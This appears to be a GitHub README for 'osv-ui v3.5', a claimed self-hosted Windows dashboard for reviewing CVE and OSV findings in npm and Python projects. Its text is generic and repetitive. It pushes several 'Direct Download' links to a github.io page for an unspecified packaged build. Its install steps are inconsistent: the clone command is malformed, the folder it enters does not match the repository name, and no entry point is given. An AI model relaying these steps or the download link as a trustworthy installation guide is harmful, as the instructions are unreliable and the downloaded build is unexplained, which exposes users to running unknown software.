# osv-ui v3.5 - CVE scanner dashboard 2026

> **Built for Windows users who need a local OSV and CVE review console, osv-ui 3.5 lets you inspect npm and Python package vulnerabilities through a self-hosted dashboard while keeping scan information on your own machine.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v3.5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/daniel-king2004/osv-ui-local-scan-hub?style=flat-square)](https://github.com/daniel-king2004/osv-ui-local-scan-hub)

---

<p align="center">
  <a href="https://daniel-king2004.github.io/osv-ui-local-scan-hub/">
    <img src="https://img.shields.io/badge/Download-osv-ui%20Latest-brightgreen?style=for-the-badge" alt="Download osv-ui">
  </a>
</p>

> **[Direct Download - osv-ui v3.5](https://daniel-king2004.github.io/osv-ui-local-scan-hub/)**

---

[Download Latest Build](https://daniel-king2004.github.io/osv-ui-local-scan-hub/)

---

## Overview

osv-ui provides a local dashboard for reviewing CVEs and OSV output from package-oriented projects. It is meant for developers and teams that want an easy way to inspect security findings without sending scan data outside their own environment.

The app is built to be self-hosted and quick to bring up, which makes it useful both for one-off package security checks and for routine review during development. Its main purpose is to surface vulnerability information clearly so you can examine npm and Python scan results in a single interface.

---

## What it offers

- Scans local projects for CVEs and package security issues
- Zero-config dashboard for fast startup and easier use
- Supports npm and Python package checks
- Displays CVE and OSV details in a readable UI
- Keeps scan data local on your system
- Runs as a self-hosted app for private deployments
- Suited for security audits and vulnerability review workflows
- Designed around local development and package-focused analysis

---

## Installation

You can either clone the repository or use the latest build, then open the app from your Windows environment.

1. Get the source:
   `git clone https://github.com/daniel-king2004/osv-ui-local-scan-hub.git
2. Enter the project folder:
   `cd osv-ui`
3. Start the dashboard using the project entry point provided by your build or deployment setup.

If you install a packaged release, launch the downloaded application directly and complete any setup steps shown on screen.

---

## How to use it

1. Open osv-ui in your browser after starting the local dashboard.
2. Point it at a local project you want to audit.
3. Run a scan to check package dependencies for CVEs and OSV matches.
4. Review the results panel for vulnerability names, severity, and package-level details.
5. Repeat scans as your dependencies change to keep findings current.

For teams, the self-hosted layout makes it easier to keep the workflow internal while still giving a shared view of scan results.

---

## Configuration

osv-ui is meant to run with very little setup. In most cases, you can begin using it without changing anything first.

When adjustments are needed, store them in the app's local configuration files or in the deployment environment associated with your installation. The exact options can differ depending on the build or hosting method you use.

---

## Requirements

- Windows platform
- Local environment for running a self-hosted dashboard
- Projects using supported package ecosystems such as npm and Python
- Sufficient disk space to store local scan data
- A modern browser for viewing the dashboard interface

---

## Common questions

**How do I get updates?**  
Use the latest release or build from the project download link and replace your current version as needed.

**Where are scan results stored?**  
The tool is designed to keep scan data local on your machine or host.

**Can I use it without configuration?**  
Yes, the dashboard is built for a zero-config start in typical setups.

**What should I do if a scan does not show results?**  
Confirm the target project uses a supported package type and that the local environment has access to the project files you want to audit.

**Is it only for npm?**  
No. The profile includes npm and Python support, and the source metadata also references broader package ecosystems.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
